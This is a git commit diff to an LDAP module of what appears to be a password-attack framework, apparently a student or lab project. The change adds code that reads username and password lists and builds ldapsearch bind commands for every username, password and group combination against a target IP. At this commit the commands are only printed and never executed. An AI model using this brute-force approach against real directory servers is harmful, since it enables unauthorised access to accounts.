a95c4c67b0a72b4af7ee901fc1f54fb7e7bc314a
Krishna Chittur <kchittur@utexas.edu>
2019-04-28 14:40:02 -0500

    small fixes

--- scripts/ldap.py
+++ scripts/ldap.py
@@ -1,3 +1,5 @@
+import itertools as it
+from subprocess import call
 from hydra import Exploit
 class LDAP(Exploit):
     name = "ldap"
@@ -5,6 +7,19 @@ class LDAP(Exploit):
     def attack(self, ip_address, usernames, passwords):
         print(f"Running LDAP attack against IP address {ip_address} with usernames {usernames} and passwords {passwords} on domain {self.domain}")
         common_usernames = ['root', 'admin', 'user']
+        with open(usernames, 'r') as f:
+            provided_usernames = f.readlines()
+        usernames = common_usernames + provided_usernames
+        with open(passwords, 'r') as f:
+            passwords = f.readlines()
         common_groups = ['admins', 'users']
+        domainstring = ','.join(['dc='+x for x in self.domain.split('.')])
+        # sample command: ldapsearch -H ldap://localhost -x -D cn=admin,ou=admins,dc=glauth,dc=com -w dogood -b dc=glauth,dc=com
+        for username, password, group in it.product(usernames, passwords, common_groups):
+            command = (f'ldapsearch -H ldap://{ip_address} -x -D cn={username},ou={group},{domainstring}'+
+                      f' -w {password} -b {domainstring}')
+            print("\tRunning command", command)
+
+
     def getloot(self, ip_address, credentials):
         pass
